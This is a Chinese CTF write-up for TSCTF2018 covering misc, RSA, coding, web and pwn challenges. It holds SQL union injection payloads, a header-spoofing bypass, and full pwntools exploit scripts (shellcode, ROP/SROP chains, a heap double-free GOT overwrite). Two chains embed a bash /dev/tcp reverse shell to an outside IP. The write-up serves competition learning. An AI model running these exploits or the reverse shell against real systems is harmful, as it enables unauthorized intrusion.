# TSCTF2018-初客卤肉饭还阔以-writeup

## MISC

### 我需要治疗

签到题

`base64`后发到天枢公众号
```
TSCTF{iT_15_HiiiigH_NO0n}
```

### 正常的魔塔

看了一下，是`RMXP`做的游戏，所以用`RGSS`解包器解包

得到游戏的工程文件，在`events`里面看到
```
print("TSCTF{" + a + "}")
```
还以为这就是`flag`，结果交上去是错的，重新回来看，发现 a 是变量 orz

要打完所有怪才能拿到正确的`flag`，没办法，正面刚

经过一系列操作（10倍跑速穿墙开门不等待，1刀秒所有怪，开门钥匙不减反增
```
TSCTF{bb6b58dd0f3f6e83}

```


### 简单的RSA

用winhex打开图片，发现36h处开始有rsa算法的一些关键信息（e,N,c）

之后就是常规操作（factorDB分解N，RSAtool解d，python脚本解字符串）（或者直接用CTF-RSA-Tools）

```
$python solve.py --verbose --decrypt_int 243447443751973982528567424728988076363119997637875514835555154791673477824856681065818912755263077705578942115259340965  -N 833810193564967701912362955539789451139872863794534923259743419423089229206473091408403560311191545764221310666338878019 -e 65537

DEBUG: factor N: try past ctf primes
DEBUG: factor N: try Gimmicky Primes method
DEBUG: factor N: try Wiener's attack
DEBUG: Starting new HTTP connection (1): www.factordb.com
DEBUG: http://www.factordb.com:80 "GET /index.php?query=833810193564967701912362955539789451139872863794534923259743419423089229206473091408403560311191545764221310666338878019 HTTP/1.1" 200 1011
DEBUG: http://www.factordb.com:80 "GET /index.php?id=1100000000886507363 HTTP/1.1" 200 916
DEBUG: http://www.factordb.com:80 "GET /index.php?id=1100000000886507362 HTTP/1.1" 200 918
INFO: TSCTF{ez_rsa_real_ez~}
INFO: 0x54534354467b657a5f7273615f7265616c5f657a7e7d

```

## CODING

### gobang

github上有出题脚本，也就是下棋ai（https://github.com/skywind3000/gobang ）

把里面的源码改一改， gamemain源码如下：

```
def gamemain():
	b = chessboard()
	s = searcher()
	s.board = b.board()
	from pwn import *
	context.log_level='debug'
	io=remote("10.112.108.77",1113)
	io.recvuntil('robot move to ')
	testc=io.recv(2)
	io.recvuntil('you move to ')
	testb=io.recv(2)
	#print testb,testc
	opening = [
		'2:'+testb+' 1:'+testc,
		#'2:IG 2:GI 1:HH',
		#'1:IH 2:GI',
		#'1:HG 2:HI',
		#'2:HG 2:HI 1:HH',
		#'1:HH 2:IH 2:GI',
		#'1:HH 2:IH 2:HI',
		#'1:HH 2:IH 2:HJ',
		#'1:HG 2:HH 2:HI',
		#'1:GH 2:HH 2:HI',
	]

	...
    ...
    ...
			print 'robot is thinking now ...'
			score, row, col = s.search(2, DEPTH)
			cord = '%s%s'%(chr(ord('A') + row), chr(ord('A') + col))
#			print 'robot move to %s (%d)'%(cord, score)
			io.sendline(cord)
			b[row][col] = 2

			if b.check() == 2:
				b.show()
				print b.dumps()
				print ''
				print 'YOU LOSE.'
				io.interactive()
				return 0

	return 0
```
```
YOU WIN !!
Here is your flag : TSCTF{Y0v_p1Ay_Go8ang_V3ry_W3!l}
```



## WEB

### are you in class

web签到题，先把限制`POST`的提交 button 删掉，换成有效的，抓包

`header`加`XFF`字段
```
X-Forwarded-For: 192.168.1.1
```
拿到`flag`
```
TSCTF{Sign_Succe55fu1_666}
```
### buy flag

令人头秃的web。。

首先发现有年龄限制，所以说想到php十六进制绕过，成功将年龄改到-1岁2333333

然而并没有什么卵用，点击Buy it 并不能拿到flag

不过看到maihuochaidexiaonvhai变成了真实用户，发现开始有数据库操作，想到从注册名注入

将payload转成16进制 payload如下：
```

-1' and 1=2 union select group_concat(schema_name) from information_schema.schemata#  读schema
-1' and 1=2 union select group_concat(table_name) from information_schema.tables where table_schema='childhappy'#  读表
-1' and 1=2 union select group_concat(column_name) from information_schema.columns where table_schema=''#  读列名
-1' and 1=2 union select tsctf_fla9 from childhappy#    cat flag 
```

## PWN

### pwn1

```
from pwn import *

context.update(arch='i386', os='linux')
binary = ELF('./main')
binary.checksec()

debug = 0

if debug:
	context.log_level = 'debug'
	io = process('./main')
	gdb.attach(io)
else:
	io = remote('10.112.108.77', 2333)

io.recvuntil('name:')
io.sendline('a')
io.recvuntil('addr:')
buf_addr = int(io.recv(9), 16)

payload = '1' + '\x00'*0x3 + 'a' + p32(0x64) 
payload += 'aaaa' + p32(buf_addr + 0x18) + p32(0x0)

io.recvuntil(')):')
io.send(payload)
io.recvuntil('name:')
# print len(asm(shellcraft.sh()))
shellcode = asm(shellcraft.sh())
payload = 'a'*0x14 + p32(buf_addr + 0x1c) + p32(0x1) + shellcode
io.sendline(payload)

io.interactive()

# TSCTF{RechArge_Make_Y0u_Str0ng3r}

```
### pwn2

```
from pwn import *

debug=0

if debug:
	client=process("/home/pwn2plumer/Desktop/easycalc")
else:
	client=remote("10.112.108.77",2334)

addr=0x0804859B

def change(index,context):
	print client.recvuntil("5. exit\n")
	client.sendline("3")
	print client.recvuntil("which number to change:\n")
	client.sendline(str(index))
	print client.recvuntil("new number:\n")
	client.sendline(str(context))

def exit():
	print client.recvuntil("5. exit\n")
	client.sendline("5")


print client.recvuntil("How many numbers you have:\n")
client.sendline("100")
print client.recvuntil("Give me your numbers\n")
client.sendline("9\n"*100)

change("1",0x9)
change("2",0x10)

change("132",0x9b)
change("133",0x85)
change("134",0x4)
change("135",0x8)

exit()
client.interactive()

pause()
```

### kidding :  original code

用srop调用59的syscall

rdi里存的是"/bin/bash\x00"的地址

rsi里存的是一个指向字符串数组的指针，指向了.bss段

.bss连续存储了四个栈上的字符串的地址，分别为execve的参数

原始版本太过于繁琐不知道构造的时候脑子到底怎么想的，以下是原始版本（更新版本在后面）

由于向.bss传值的时候context基本相同，所以仅注释了第一部分的gadget

```

from pwn import *

debug=0

if debug:
	client=process("/home/pwn2plumer/Desktop/kidding")
else:
	client=remote("10.112.108.77",2335)

print client.recvuntil("make by w1tcher.\n")

context=""
context+="a"*0x10
context+=p64(0x1)#ebp

context+=p64(0x0000000000400121)#pop rax;ret
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)#mov rbp,rsp;call rax-->add rsp,0x158;ret

#rax ok
context+="bash"
context+="\x00"*(0x150-0x4)#padding
context+=p64(0x0000000000400D61)#pop r12;pop r13;pop r14;ret
context+=p64(0x0)#r12
context+=p64(0x0)#r13
context+=p64(0x0)#r14
context+=p64(0x400d5f)#pop r12;pop r13;pop r14; pop r15;ret
context+=p64(0x0)#r12
context+=p64(0x0)#r13
context+=p64(0x00000000004009b9)#r14
context+=p64(0x0)#r15
context+=p64(0x400CC4)#lea rax,[r12+rbp];jmp short loc_400CE3-->pop rdx;pop rbx;pop rbp;pop r12;pop r13;ret
context+=p64(0x0)#rdx
context+=p64(0x0)#rbx
context+=p64(0x0)#rbp
context+=p64(0x0)#r12
context+=p64(0x0)#r13
context+=p64(0x004007A1)#mov rdi,rax;jmp 0x4009C0-->mov rdi,rax;ret
context+=p64(0x0000000000400121)#pop rax;ret
context+=p64(0x00000000004009c9)#rax
context+=p64(0x0000000000400c76)#pop r12;pop r13;jmp rax-->mov rax,rdi;ret
context+=p64(1)
context+=p64(2)
context+=p64(3)

#rdi
context+=p64(0x40077c)#pop rdi,ret
context+=p64(0x00000000006021C0)#rdi
context+=p64(0x400c01)#mov [rdi+20h],rax;xor eax,eax;ret

context+=p64(0x0000000000400121)#pop rax;ret
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)#mov rbp,rsp;call rax-->add add rsp,0x158;ret

#rax ok
context+="-c"
context+="\x00"*(0x150-2)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x004007A1)
context+=p64(0x0000000000400121)#change rax
context+=p64(0x00000000004009c9)
context+=p64(0x0000000000400c76)
context+=p64(1)
context+=p64(2)
context+=p64(3)

#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8)
context+=p64(0x400c01)

context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="bash -i >& /dev/tcp/10.122.212.229/1111 0>&1"
context+="\x00"*(0x150-45+1)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x004007A1)
context+=p64(0x0000000000400121)#change rax
context+=p64(0x00000000004009c9)
context+=p64(0x0000000000400c76)
context+=p64(1)
context+=p64(2)
context+=p64(3)

#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8+0x8)
context+=p64(0x400c01)


context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="\x00"*(0x150)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x004007A1)
context+=p64(0x0000000000400121)#change rax
context+=p64(0x00000000004009c9)
context+=p64(0x0000000000400c76)
context+=p64(1)
context+=p64(2)
context+=p64(3)

#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8+0x8+0x8)
context+=p64(0x400c01)

context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="/bin/bash"
context+="\x00"*(0x150-0x9)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x004007A1)
context+=p64(0x0000000000400121)#change rax
context+=p64(0x0000000000400869)#
context+=p64(0x0000000000400c76)

context+=p64(0x6021c0-0x20)
context+=p64(0x0)
context+=p64(0x0000000000400866)
context+=p64(59)
context+=p64(0)

context+=p64(0x400866)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0x400d64)
context+=p64(0x6021c0+0x20)
context+=p64(0)

context+=p64(0x0000000000400121)

context+=p64(59)#rax
context+=p64(0x400400)#syscall

client.sendline(context)

pause()


```

### kidding :  updated code

删去了30行左右少用了4个gadget

思考：这一题我觉得有可能syscall把stdio打开，然后直接/bin/sh

```
from pwn import *

debug=1

if debug:
	client=process("/home/pwn2plumer/Desktop/kidding")
else:
	client=remote("10.112.108.77",2335)

print client.recvuntil("make by w1tcher.\n")

context=""
context+="a"*0x10
context+=p64(0x1)#ebp

context+=p64(0x0000000000400121)#pop rax;ret
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)#mov rbp,rsp;call rax-->add rsp,0x158;ret

#rax ok
context+="bash"
context+="\x00"*(0x150-0x4)#padding
context+=p64(0x0000000000400D61)#pop r12;pop r13;pop r14;ret
context+=p64(0x0)#r12
context+=p64(0x0)#r13
context+=p64(0x0)#r14
context+=p64(0x400d5f)#pop r12;pop r13;pop r14; pop r15;ret
context+=p64(0x0)#r12
context+=p64(0x0)#r13
context+=p64(0x00000000004009b9)#r14
context+=p64(0x0)#r15
context+=p64(0x400CC4)#lea rax,[r12+rbp];jmp short loc_400CE3-->pop rdx;pop rbx;pop rbp;pop r12;pop r13;ret
context+=p64(0x0)#rdx
context+=p64(0x0)#rbx
context+=p64(0x0)#rbp
context+=p64(0x0)#r12
context+=p64(0x0)#r13


#rdi
context+=p64(0x40077c)#pop rdi,ret
context+=p64(0x00000000006021C0)#rdi
context+=p64(0x400c01)#mov [rdi+20h],rax;xor eax,eax;ret

context+=p64(0x0000000000400121)#pop rax;ret
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)#mov rbp,rsp;call rax-->add add rsp,0x158;ret

#rax ok
context+="-c"
context+="\x00"*(0x150-2)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)


#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8)
context+=p64(0x400c01)

context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="bash -i >& /dev/tcp/10.122.212.229/1111 0>&1"
context+="\x00"*(0x150-45+1)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)


#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8+0x8)
context+=p64(0x400c01)


context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="\x00"*(0x150)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)


#rdi
context+=p64(0x40077c)#change
context+=p64(0x00000000006021C0+0x8+0x8+0x8)
context+=p64(0x400c01)

context+=p64(0x0000000000400121)
context+=p64(0x0000000000400439)#rax
context+=p64(0x40024b)

#rax ok
context+="/bin/bash"
context+="\x00"*(0x150-0x9)
context+=p64(0x0000000000400D61)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x400d5f)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x00000000004009b9)#####  eax
context+=p64(0x0)
context+=p64(0x400CC4)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x0)
context+=p64(0x004007A1)
context+=p64(0x0000000000400121)#change rax
context+=p64(0x0000000000400869)#
context+=p64(0x0000000000400c76)

context+=p64(0x6021c0-0x20)
context+=p64(0x0)
context+=p64(0x0000000000400866)
context+=p64(59)
context+=p64(0)

context+=p64(0x400866)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0)
context+=p64(0x400d64)
context+=p64(0x6021c0+0x20)
context+=p64(0)

context+=p64(0x0000000000400121)

context+=p64(59)#rax
context+=p64(0x400400)#syscall

client.sendline(context)

pause()
```


### heap_attack

doublefree without fastbin_chunk

rewrite the .bss data

开始的想法是fastbin_dup，但是遇到的问题就是alloc fastchunk时size位控制的不好，索性直接用标准的doublefree

```
from pwn import*

context.log_level = 'debug'

debug=0

if debug:
	client=process("/home/pwn2plumer/Desktop/heap_attack")
else:
	client=remote("10.112.108.77",2338)

def new_note(length,context):
	print client.recvuntil("Input ur choice:")
	client.sendline("1")
	print client.recvuntil("Input size:")
	client.sendline(str(length))
	print client.recvuntil("Input content:")
	client.sendline(str(context))

def edit_note(index,context):
	print client.recvuntil("Input ur choice:")
	client.sendline("3")
	print client.recvuntil("Input index:")
	client.sendline(str(index))
	print client.recvuntil("Input content:")
	client.sendline(str(context))

def delete_note(index):
	print client.recvuntil("Input ur choice:")
	client.sendline("2")
	print client.recvuntil("Input index:")
	client.sendline(str(index))

new_note(0x80,"\x11"*0x79)#chunk 0
new_note(0x80,"\x11"*0x79)#num   1
new_note(0x80,"\x11"*0x79)#num 2

new_note(0x80,"\x11"*0x79)#chunk 3
new_note(0x80,"\x11"*0x79)#num  4
new_note(0x80,"\x00"*0x79)#num 5
new_note(0x80,"\x11"*0x79)#num 6
new_note(0x80,"\x00"*0x79)#num 7


delete_note(4)
delete_note(5)
delete_note(6)

#double free

context=""
context+=p64(0x0)
context+=p64(0x81)
context+=p64(0x00000000006020e8)#fd
context+=p64(0x00000000006020e8+0x8)#bk
context+='a'*(0x60)
context+=p64(0x80)
context+=p64(0x90)
context+='\x44'*0x80
context+=p64(0x90)
context+=p64(0x11)
context+='\x11'*0x29
new_note(0x150,context)

delete_note(5)

#rewrite bss
payload=""
payload+="\x18\x20\x60\x00"
edit_note(4,payload)

#change the free@got to system@plt
edit_note(1,p64(0x0000000004007b0))

#use fake free
new_note(0x20,"/bin/sh\x00")
delete_note(9)

client.interactive()

```
